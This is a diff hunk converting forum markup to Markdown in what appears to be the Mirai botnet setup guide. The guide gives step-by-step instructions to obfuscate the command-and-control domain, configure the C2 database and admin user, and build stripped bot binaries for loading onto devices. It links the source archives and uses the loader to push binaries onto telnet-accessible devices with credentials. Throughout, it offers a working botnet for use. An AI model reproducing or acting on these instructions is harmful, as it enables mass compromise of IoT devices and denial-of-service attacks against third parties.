@@ -18,84 +18,83 @@ Bot has several configuration options that are obfuscated in (table.c/table.h). 
 In ./mirai/tools you will find something called enc.c - You must compile this to output things to put in the table.c file
 
 Run this inside mirai directory
-[code]
+```
 ./build.sh debug telnet
-[/code]
+```
 You will get some errors related to cross-compilers not being there if you have not configured them. This is ok, won't affect compiling the enc tool
 
 Now, in the ./mirai/debug folder you should see a compiled binary called enc. For example, to get obfuscated string for domain name for bots to connect to, use this:
-[code]
+```
 ./debug/enc string fuck.the.police.com
-[/code]
-
+```
 The output should look like this
-[code]
+```
 XOR'ing 20 bytes of data...
 \x44\x57\x41\x49\x0C\x56\x4A\x47\x0C\x52\x4D\x4E\x4B\x41\x47\x0C\x41\x4D\x4F\x22
-[/code]
+```
 
 To update the TABLE_CNC_DOMAIN value for example, replace  that long hex string with the one provided by enc tool. Also, you see "XOR'ing 20 bytes of data". This value must replace the last argument tas well. So for example, the table.c line originally looks like this
 
-[/code]
+```
 add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 30); // cnc.changeme.com
-[/code]
+```
 
 Now that we know value from enc tool, we update it like this
-[code]
+```
 add_entry(TABLE_CNC_DOMAIN, "\x44\x57\x41\x49\x0C\x56\x4A\x47\x0C\x52\x4D\x4E\x4B\x41\x47\x0C\x41\x4D\x4F\x22", 20); // fuck.the.police.com
-[/code]
+```
 
 Some values are strings, some are port (uint16 in network order / big endian).
 
-[size=x-large]Configuring CNC[/size]
-[code]
+#Configuring the CNC
+```
 apt-get install mysql-server mysql-client
-[/code]
+```
 CNC requires database to work. When you install database, go into it and run following commands:
 http://pastebin.com/86d0iL9g
 
 This will create database for you. To add your user,
-[code]
+```
 INSERT INTO users VALUES (NULL, 'anna-senpai', 'myawesomepassword', 0, 0, 0, 0, -1, 1, 30, '');
-[/code]
+```
 
 Now, go into file ./mirai/cnc/main.go
 
 Edit these values
 
-[code]
+```
 const DatabaseAddr string   = "127.0.0.1"
 const DatabaseUser string   = "root"
 const DatabasePass string   = "password"
 const DatabaseTable string  = "mirai"
-[/code]
+```
 
 To the information for the mysql server you just installed
 
 
-[size=x-large]Setting Up Cross Compilers[/size]
+#Setting Up Cross Compilers
 Cross compilers are easy, follow the instructions at this link to set up. You must restart your system or reload .bashrc file for these changes to take effect.
 
 http://pastebin.com/1rRCc3aD
 
-[size=x-large]Building CNC+Bot[/size]
+#Building CNC+Bot
 The CNC, bot, and related tools:
-1) http://santasbigcandycane.cx/mirai.src.zip - [b]THESE LINKS WILL NOT LAST FOREVER, 2 WEEKS MAX - BACK IT UP![/b]
-[img]http://i.imgur.com/BVc7qJs.png[/img]
+1) http://santasbigcandycane.cx/mirai.src.zip - ### THESE LINKS WILL NOT LAST FOREVER, 2 WEEKS MAX - BACK IT UP!
+http://i.imgur.com/BVc7qJs.png
 
-2) http://santasbigcandycane.cx/loader.src.zip - [b]THESE LINKS WILL NOT LAST FOREVER, 2 WEEKS MAX - BACK IT UP![/b]
+2) http://santasbigcandycane.cx/loader.src.zip - ### THESE LINKS WILL NOT LAST FOREVER, 2 WEEKS MAX - BACK IT UP![/b]
 
 How to build bot + CNC
 In mirai folder, there is build.sh script.
 
-[code]
+```
 ./build.sh debug telnet
-[/code]
+```
 Will output debug binaries of bot that will not daemonize and print out info about if it can connect to CNC, etc, status of floods, etc. Compiles to ./mirai/debug folder
 
-[code]
+```
 ./build.sh release telnet
-[/code]
+```
 Will output production-ready binaries of bot that are extremely stripped, small (about 60K) that should be loaded onto devices. Compiles all binaries in format: "mirai.$ARCH" to ./mirai/release folder
 
 
@@ -104,18 +103,17 @@ Loader reads telnet entries from STDIN in following format:
 [code]ip:port user:pass[/code]
 It detects if there is wget or tftp, and tries to download the binary using that. If not, it will echoload a tiny binary (about 1kb) that will suffice as wget.
 
-[code]
+```
 ./build.sh
-[/code]
+```
 Will build the loader, optimized, production use, no fuss. If you have a file in formats used for loading, you can do this
-
-[code]
+```
 cat file.txt | ./loader
-[/code]
+```
 
 Remember to ulimit!
-
+```
 Just so it's clear, I'm not providing any kind of 1 on 1 help tutorials or shit, too much time. All scripts and everything are included to set up working botnet in under 1 hours. I am willing to help if you have individual questions (how come CNC not connecting to database, I did this this this blah blah), but not questions like "My bot not connect, fix it"
-[/quote]
 
+```
 
